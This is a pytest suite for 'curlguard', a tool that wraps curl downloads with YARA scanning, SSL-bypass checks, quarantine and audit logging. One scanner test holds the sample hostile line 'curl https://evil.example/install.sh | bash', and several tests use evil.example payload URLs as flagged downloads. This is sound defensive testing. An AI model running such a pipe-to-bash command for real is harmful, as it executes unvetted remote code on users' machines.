import hashlib
import json
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from curlguard.config import CurlGuardConfig, load_config
from curlguard.curl_manager import CurlManager
from curlguard.logger import AuditEvent, AuditLogger
from curlguard.scanner import ScanResult, YaraScanner
from curlguard.ssl_detector import SslBypassDetector, SslBypassResult
from curlguard.wrapper import CurlWrapper


@pytest.fixture
def temp_config(tmp_path):
    config = CurlGuardConfig(
        mode="per-user",
        log_path=tmp_path / "audit.log",
        rules_dirs=[tmp_path / "rules"],
        quarantine_dir=tmp_path / "quarantine",
        real_curl_path=Path("/usr/bin/curl"),
    )
    config.force_intercept = True
    config.quarantine_dir.mkdir(parents=True, exist_ok=True)
    return config


@pytest.fixture
def mock_ssl_detector():
    detector = MagicMock(spec=SslBypassDetector)
    detector.detect.return_value = SslBypassResult(
        is_bypass=False,
        bypass_type=None,
        severity="warning",
        message="",
    )
    return detector


def test_scanner_true_positive_matches_foundation_rules():
    pytest.importorskip("yara")
    scanner = YaraScanner([Path("src/curlguard/rules")])
    result = scanner.scan(b"#!/bin/bash\ncurl https://evil.example/install.sh | bash\n")
    assert result.clean is False
    assert "suspicious_pipe_bash" in result.rules_triggered
    assert result.status == "flagged"


def test_scanner_true_negative_stays_clean():
    pytest.importorskip("yara")
    scanner = YaraScanner([Path("src/curlguard/rules")])
    result = scanner.scan(
        b"#!/bin/sh\necho safe install\ncurl https://example.com/file.txt -o /tmp/file.txt\n"
    )
    assert result.clean is True
    assert result.rules_triggered == []
    assert result.status == "clean"


def test_true_negative_example_content_stays_clean():
    pytest.importorskip("yara")
    scanner = YaraScanner([Path("src/curlguard/rules")])
    result = scanner.scan(
        b'#!/bin/bash\nset -e\necho "curlguard clean test script"\n'
        b'echo "This script is expected to pass without opening the review prompt."\n'
    )
    assert result.clean is True
    assert result.rules_triggered == []


def test_scanner_unavailable_status_is_explicit():
    scanner = YaraScanner([])
    scanner._yara_available = False
    scanner._load_error = "yara-python is not installed"
    result = scanner.scan(b"echo hello")
    assert result.clean is True
    assert result.status == "unavailable"
    assert "yara-python" in result.error


def test_config_env_override(monkeypatch):
    monkeypatch.setenv("CURLGUARD_LOG_PATH", "/tmp/override.log")
    monkeypatch.setenv("CURLGUARD_MODE", "per-user")
    monkeypatch.setenv("CURLGUARD_SCAN_FAILURE_MODE", "block")
    config = load_config()
    assert config.log_path == Path("/tmp/override.log")
    assert config.scan_failure_mode == "block"


def test_logger_writes_json(tmp_path):
    logger = AuditLogger(tmp_path / "audit.log")
    logger.log(
        AuditEvent(
            timestamp="2024-01-01T00:00:00+00:00",
            url="https://example.com/file.sh",
            destination="/tmp/out.sh",
            scan_result="clean",
            rules_triggered=[],
            user_decision=None,
            ssl_bypass_detected=False,
            duration_ms=100.0,
            exit_code=0,
        )
    )
    logger.close()
    parsed = json.loads((tmp_path / "audit.log").read_text().splitlines()[0])
    assert parsed["url"] == "https://example.com/file.sh"
    assert parsed["scan_result"] == "clean"


def test_curl_manager_per_user_install_writes_wrapper(tmp_path, monkeypatch):
    real_curl = tmp_path / "system" / "curl"
    real_curl.parent.mkdir(parents=True, exist_ok=True)
    real_curl.write_text("")

    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    with patch("curlguard.curl_manager._discover_system_curl", return_value=real_curl):
        manager = CurlManager("per-user")
        manager.install()

    wrapper_contents = manager._curl_path.read_text(encoding="utf-8")
    assert manager._curl_path.exists()
    assert manager._curl_real == real_curl
    assert "CURLGUARD_MODE:=per-user" in wrapper_contents
    assert "CURLGUARD_SHIM_ACTIVE=1" in wrapper_contents
    assert str(real_curl) in wrapper_contents


def test_curl_manager_system_wide_paths():
    manager = CurlManager("system-wide")
    assert manager._curl_path == Path("/usr/local/libexec/curlguard/bin/curl")
    assert manager._curl_real != Path("/usr/bin/curl.real")


def test_wrapper_extract_output_supports_stdout_marker(temp_config, mock_ssl_detector):
    wrapper = CurlWrapper(
        temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector
    )
    assert wrapper._extract_output(["-o", "-", "https://example.com"]) is None
    wrapper._logger.close()


def test_wrapper_download_to_temp_rewrites_output_flags(temp_config, mock_ssl_detector):
    wrapper = CurlWrapper(
        temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector
    )

    def fake_run(cmd, stdout=None, stderr=None):
        temp_path = Path(cmd[-1])
        temp_path.write_text("downloaded")
        assert "-o" not in cmd
        assert "out.sh" not in cmd
        return MagicMock(returncode=0, stderr=b"")

    with patch("curlguard.wrapper.subprocess.run", side_effect=fake_run):
        temp_path = wrapper._download_to_temp(
            ["-fsSL", "-o", "out.sh", "https://example.com/file.sh"]
        )

    assert temp_path.read_text() == "downloaded"
    wrapper._logger.close()


def test_wrapper_warn_mode_allows_scan_failure(
    temp_config, mock_ssl_detector, tmp_path
):
    temp_config.scan_failure_mode = "warn"
    scanner = MagicMock()
    scanner.scan_file.return_value = ScanResult(
        clean=True,
        matches=[],
        rules_triggered=[],
        scan_time_ms=1.0,
        status="unavailable",
        error="yara-python is not installed",
    )
    logger = AuditLogger(temp_config.log_path)
    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)

    downloaded = tmp_path / "payload.download"
    downloaded.write_text("#!/bin/sh\necho ok\n")
    wrapper._download_to_temp = lambda args: downloaded

    output = tmp_path / "out.sh"
    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
    logger.close()

    assert exit_code == 0
    assert output.read_text() == "#!/bin/sh\necho ok\n"
    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
    assert event["scan_result"] == "unavailable"
    assert event["user_decision"] == "allow"


def test_wrapper_clean_download_reports_saved_location(
    temp_config, mock_ssl_detector, tmp_path, capsys
):
    scanner = MagicMock()
    scanner.scan_file.return_value = ScanResult(
        clean=True,
        matches=[],
        rules_triggered=[],
        scan_time_ms=1.0,
        status="clean",
    )
    logger = AuditLogger(temp_config.log_path)
    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)

    downloaded = tmp_path / "payload.download"
    downloaded.write_text("ok")
    wrapper._download_to_temp = lambda args: downloaded

    output = tmp_path / "out.sh"
    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
    logger.close()

    captured = capsys.readouterr()
    checksum = hashlib.sha256(b"ok").hexdigest()
    assert exit_code == 0
    assert f"saved to {output}" in captured.err
    assert "2 bytes" in captured.err
    assert f"sha256={checksum}" in captured.err


def test_wrapper_block_mode_blocks_scan_failure(
    temp_config, mock_ssl_detector, tmp_path
):
    temp_config.scan_failure_mode = "block"
    scanner = MagicMock()
    scanner.scan_file.return_value = ScanResult(
        clean=True,
        matches=[],
        rules_triggered=[],
        scan_time_ms=1.0,
        status="error",
        error="rule compilation failed",
    )
    logger = AuditLogger(temp_config.log_path)
    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)

    downloaded = tmp_path / "payload.download"
    downloaded.write_text("blocked")
    wrapper._download_to_temp = lambda args: downloaded

    output = tmp_path / "blocked.sh"
    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
    logger.close()

    assert exit_code == 1
    assert not output.exists()
    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
    assert event["scan_result"] == "error"
    assert event["user_decision"] == "block"


def test_wrapper_quarantine_decision_moves_file(
    temp_config, mock_ssl_detector, tmp_path, monkeypatch
):
    scanner = MagicMock()
    scanner.scan_file.return_value = ScanResult(
        clean=False,
        matches=["malware"],
        rules_triggered=["suspicious_pipe_bash"],
        scan_time_ms=1.0,
        status="flagged",
    )
    logger = AuditLogger(temp_config.log_path)
    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)

    downloaded = tmp_path / "malware.download"
    downloaded.write_text("evil")
    wrapper._download_to_temp = lambda args: downloaded

    monkeypatch.setattr(
        "curlguard.review.prompt_user", lambda *args, **kwargs: "quarantine"
    )

    exit_code = wrapper.dispatch(
        ["https://evil.example/payload.sh", "-o", str(tmp_path / "ignored.sh")]
    )
    logger.close()

    quarantined = list(temp_config.quarantine_dir.glob("*"))
    assert exit_code == 1
    assert len(quarantined) == 1
    assert quarantined[0].read_text() == "evil"


def test_wrapper_allowed_flagged_download_reports_saved_location(
    temp_config, mock_ssl_detector, tmp_path, monkeypatch, capsys
):
    scanner = MagicMock()
    scanner.scan_file.return_value = ScanResult(
        clean=False,
        matches=["malware"],
        rules_triggered=["suspicious_pipe_bash"],
        scan_time_ms=1.0,
        status="flagged",
    )
    logger = AuditLogger(temp_config.log_path)
    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)

    downloaded = tmp_path / "allowed.download"
    downloaded.write_text("allowed")
    wrapper._download_to_temp = lambda args: downloaded

    monkeypatch.setattr("curlguard.review.prompt_user", lambda *args, **kwargs: "allow")

    output = tmp_path / "allowed.sh"
    exit_code = wrapper.dispatch(["https://evil.example/payload.sh", "-o", str(output)])
    logger.close()

    captured = capsys.readouterr()
    checksum = hashlib.sha256(b"allowed").hexdigest()
    assert exit_code == 0
    assert f"saved to {output}" in captured.err
    assert "allowed by user decision" in captured.err
    assert "7 bytes" in captured.err
    assert f"sha256={checksum}" in captured.err


def test_wrapper_unsupported_requests_passthrough(temp_config, mock_ssl_detector):
    wrapper = CurlWrapper(
        temp_config, MagicMock(), AuditLogger(temp_config.log_path), mock_ssl_detector
    )
    assert (
        wrapper._should_intercept(
            ["-I", "https://example.com"], ["https://example.com"]
        )
        is False
    )
    wrapper._logger.close()


def test_wrapper_can_block_ssl_bypass(temp_config, tmp_path):
    temp_config.ssl_warn_only = False
    scanner = MagicMock()
    logger = AuditLogger(temp_config.log_path)
    ssl_detector = MagicMock(spec=SslBypassDetector)
    ssl_detector.detect.return_value = SslBypassResult(
        is_bypass=True,
        bypass_type="ssl-version",
        severity="block",
        message="TLS version too low",
    )
    wrapper = CurlWrapper(temp_config, scanner, logger, ssl_detector)

    exit_code = wrapper.dispatch(
        ["https://example.com/file.sh", "-o", str(tmp_path / "out.sh")]
    )
    logger.close()

    assert exit_code == 1
    event = json.loads(temp_config.log_path.read_text().splitlines()[0])
    assert event["ssl_bypass_detected"] is True
    assert event["user_decision"] == "block"
